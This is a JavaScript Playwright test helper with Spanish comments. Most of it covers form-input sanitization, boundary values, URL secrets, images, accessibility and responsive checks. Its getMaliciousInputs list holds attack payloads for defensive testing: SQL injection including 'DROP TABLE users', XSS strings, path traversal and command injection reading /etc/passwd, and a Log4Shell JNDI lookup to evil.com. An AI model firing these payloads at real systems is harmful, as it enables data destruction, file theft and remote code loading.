import { expect } from '@playwright/test';
import { logger } from './logger.js';


export class ValidationHelper {
  constructor(page) {
    this.page = page;
  }

   // Prueba inputs maliciosos en un campo de texto
 
  async testMaliciousInputs(inputElement, maliciousInputs) {
    logger.step('Probando inputs maliciosos');
    
    const results = [];
    
    for (const maliciousInput of maliciousInputs) {
      try {
        await inputElement.clear();
        await inputElement.fill(maliciousInput);
        await this.page.waitForTimeout(300);
        
        const actualValue = await inputElement.inputValue();
        
        const result = {
          input: maliciousInput,
          output: actualValue,
          wasSanitized: actualValue !== maliciousInput,
          wasBlocked: actualValue === '',
          timestamp: new Date().toISOString()
        };
        
        results.push(result);
        
        logger.info(`Input: "${maliciousInput.substring(0, 30)}..."`);
        logger.info(`Output: "${actualValue.substring(0, 30)}..."`);
        logger.info(`Sanitizado: ${result.wasSanitized ? 'SÍ ' : 'NO '}`);
        
      } catch (error) {
        results.push({
          input: maliciousInput,
          output: null,
          wasSanitized: false,
          wasBlocked: true,
          error: error.message,
          timestamp: new Date().toISOString()
        });
        
        logger.info(`Input bloqueado: "${maliciousInput.substring(0, 30)}..."`);
      }
    }
    
    return results;
  }

   // Obtiene una lista de inputs maliciosos comunes
  
  getMaliciousInputs() {
    return [
      // SQL Injection
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' UNION SELECT * FROM users--",
      "admin'--",
      "' OR 1=1--",
      
      // XSS (Cross-Site Scripting)
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      "<iframe src='javascript:alert(1)'>",
      "<svg onload=alert('XSS')>",
      
      // Path Traversal
      "../../../etc/passwd",
      "..\\..\\..\\windows\\win.ini",
      "....//....//....//etc/passwd",
      
      // Command Injection
      "; ls -la",
      "| cat /etc/passwd",
      "& dir",
      
      // LDAP Injection
      "${jndi:ldap://evil.com/a}",
      
      // NoSQL Injection
      "{'$gt': ''}",
      
      // HTML Injection
      "<h1>Injected</h1>",
      "<style>body{display:none}</style>",
      
      // Special Characters
      "null",
      "undefined",
      "NaN",
      "Infinity",
      
      // Unicode
      "\\u0000",
      "\\uFFFD"
    ];
  }

   //Prueba valores límite en un campo numérico
  
  async testBoundaryValues(inputElement, options = {}) {
    logger.step('Probando valores límite');
    
    const { min = 1, max = 100 } = options;
    
    const boundaryTests = [
      { value: '0', expected: 'rejected', description: 'Cero' },
      { value: '-1', expected: 'rejected', description: 'Negativo' },
      { value: `${min}`, expected: 'accepted', description: `Mínimo (${min})` },
      { value: `${min - 1}`, expected: 'rejected', description: `Menor que mínimo (${min - 1})` },
      { value: `${max}`, expected: 'accepted', description: `Máximo (${max})` },
      { value: `${max + 1}`, expected: 'rejected', description: `Mayor que máximo (${max + 1})` },
      { value: 'abc', expected: 'rejected', description: 'Letras' },
      { value: '1.5', expected: 'maybe', description: 'Decimal' },
      { value: '999999', expected: 'rejected', description: 'Muy grande' },
      { value: '', expected: 'rejected', description: 'Vacío' },
      { value: ' ', expected: 'rejected', description: 'Espacio' },
      { value: '01', expected: 'maybe', description: 'Con cero inicial' }
    ];
    
    const results = [];
    
    for (const test of boundaryTests) {
      try {
        await inputElement.clear();
        await inputElement.fill(test.value);
        await this.page.waitForTimeout(300);
        
        const actualValue = await inputElement.inputValue();
        
        const result = {
          ...test,
          actualValue,
          passed: actualValue !== '' || test.expected === 'rejected'
        };
        
        results.push(result);
        
        logger.info(`${test.description}: "${test.value}" → "${actualValue}"`);
        
      } catch (error) {
        results.push({
          ...test,
          actualValue: null,
          error: error.message,
          passed: test.expected === 'rejected'
        });
      }
    }
    
    return results;
  }

   // Verifica que un campo rechaza valores inválidos
  
  async verifyRejectsInvalidValues(inputElement, invalidValues) {
    logger.step('Verificando rechazo de valores inválidos');
    
    let allRejected = true;
    
    for (const invalidValue of invalidValues) {
      await inputElement.clear();
      await inputElement.fill(invalidValue);
      await this.page.waitForTimeout(200);
      
      const actualValue = await inputElement.inputValue();
      
      if (actualValue === invalidValue) {
        logger.warning(` Valor inválido aceptado: "${invalidValue}"`);
        allRejected = false;
      } else {
        logger.info(` Valor rechazado: "${invalidValue}"`);
      }
    }
    
    return allRejected;
  }

   //Mide el tiempo de respuesta de una acción
  
  async measureResponseTime(action) {
    const startTime = Date.now();
    
    let result;
    let error = null;
    
    try {
      result = await action();
    } catch (e) {
      error = e;
    }
    
    const endTime = Date.now();
    const duration = endTime - startTime;
    
    logger.info(`Tiempo de respuesta: ${duration}ms`);
    
    return {
      duration,
      result,
      error,
      startTime,
      endTime
    };
  }

   //Verifica que no hay información sensible en la URL
   
  async verifyUrlSecurity() {
    logger.step('Verificando seguridad de URL');
    
    const currentUrl = this.page.url();
    
    const sensitivePatterns = [
      /password/i,
      /token/i,
      /api[_-]?key/i,
      /secret/i,
      /auth/i,
      /session/i,
      /credential/i,
      /private/i
    ];
    
    const findings = [];
    
    for (const pattern of sensitivePatterns) {
      if (pattern.test(currentUrl)) {
        findings.push({
          pattern: pattern.source,
          found: true,
          severity: 'high'
        });
        logger.warning(` Patrón sensible encontrado: ${pattern.source}`);
      }
    }
    
    return {
      url: currentUrl,
      isSecure: findings.length === 0,
      findings
    };
  }

   //Verifica la carga de imágenes en la página
  
  async verifyImageLoading(maxImagesToCheck = 10) {
    logger.step('Verificando carga de imágenes');
    
    const images = this.page.locator('img');
    const imageCount = await images.count();
    
    const checkCount = Math.min(imageCount, maxImagesToCheck);
    
    let loadedCount = 0;
    let brokenCount = 0;
    const brokenImages = [];
    
    for (let i = 0; i < checkCount; i++) {
      try {
        const image = images.nth(i);
        const isVisible = await image.isVisible({ timeout: 2000 });
        
        if (isVisible) {
          const naturalWidth = await image.evaluate(img => img.naturalWidth);
          const src = await image.getAttribute('src');
          
          if (naturalWidth > 0) {
            loadedCount++;
          } else {
            brokenCount++;
            brokenImages.push(src);
            logger.warning(` Imagen rota: ${src}`);
          }
        }
      } catch (error) {
        brokenCount++;
      }
    }
    
    const successRate = (loadedCount / checkCount) * 100;
    
    logger.info(` Imágenes cargadas: ${loadedCount}/${checkCount}`);
    logger.info(` Tasa de éxito: ${successRate.toFixed(2)}%`);
    
    return {
      total: imageCount,
      checked: checkCount,
      loaded: loadedCount,
      broken: brokenCount,
      brokenImages,
      successRate
    };
  }
  
   // Verifica atributos de accesibilidad en elementos
   
  async verifyAccessibility(elements) {
    logger.step('Verificando accesibilidad');
    
    const count = await elements.count();
    const checkCount = Math.min(count, 10);
    
    let withAriaLabel = 0;
    let withRole = 0;
    let withAlt = 0;
    
    for (let i = 0; i < checkCount; i++) {
      const element = elements.nth(i);
      
      const ariaLabel = await element.getAttribute('aria-label').catch(() => null);
      const role = await element.getAttribute('role').catch(() => null);
      const alt = await element.getAttribute('alt').catch(() => null);
      
      if (ariaLabel) withAriaLabel++;
      if (role) withRole++;
      if (alt) withAlt++;
    }
    
    logger.info(`🔍 Elementos con aria-label: ${withAriaLabel}/${checkCount}`);
    logger.info(`🔍 Elementos con role: ${withRole}/${checkCount}`);
    logger.info(`🔍 Elementos con alt: ${withAlt}/${checkCount}`);
    
    return {
      total: count,
      checked: checkCount,
      withAriaLabel,
      withRole,
      withAlt,
      accessibilityScore: ((withAriaLabel + withRole + withAlt) / (checkCount * 3)) * 100
    };
  }

   // Prueba navegación por teclado
   
  async testKeyboardNavigation(tabCount = 5) {
    logger.step('Probando navegación por teclado');
    
    const focusedElements = [];
    
    for (let i = 0; i < tabCount; i++) {
      await this.page.keyboard.press('Tab');
      await this.page.waitForTimeout(200);
      
      const focusedElement = await this.page.evaluate(() => {
        const el = document.activeElement;
        return {
          tagName: el?.tagName,
          id: el?.id,
          className: el?.className,
          text: el?.textContent?.substring(0, 50)
        };
      });
      
      focusedElements.push(focusedElement);
      logger.info(`Tab ${i + 1}: ${focusedElement.tagName} - ${focusedElement.text || focusedElement.id}`);
    }
    
    return focusedElements;
  }

   // Verifica el diseño responsive
  
  async verifyResponsiveDesign(viewports) {
    logger.step('Verificando diseño responsive');
    
    const results = [];
    
    for (const viewport of viewports) {
      await this.page.setViewportSize({
        width: viewport.width,
        height: viewport.height
      });
      await this.page.waitForTimeout(1000);
      
      // Verificar elementos clave
      const logo = this.page.locator('.v-toolbar, img[alt*="logo"]').first();
      const cartButton = this.page.locator('button:has(i.mdi-cart)').first();
      
      const logoVisible = await logo.isVisible({ timeout: 2000 }).catch(() => false);
      const cartVisible = await cartButton.isVisible({ timeout: 2000 }).catch(() => false);
      
      const result = {
        viewport: viewport.name,
        width: viewport.width,
        height: viewport.height,
        logoVisible,
        cartVisible,
        passed: logoVisible || cartVisible
      };
      
      results.push(result);
      
      logger.info(`${viewport.name}: Logo=${logoVisible ? '' : ''}, Cart=${cartVisible ? '' : ''}`);
    }
    
    return results;
  }
}

export default ValidationHelper;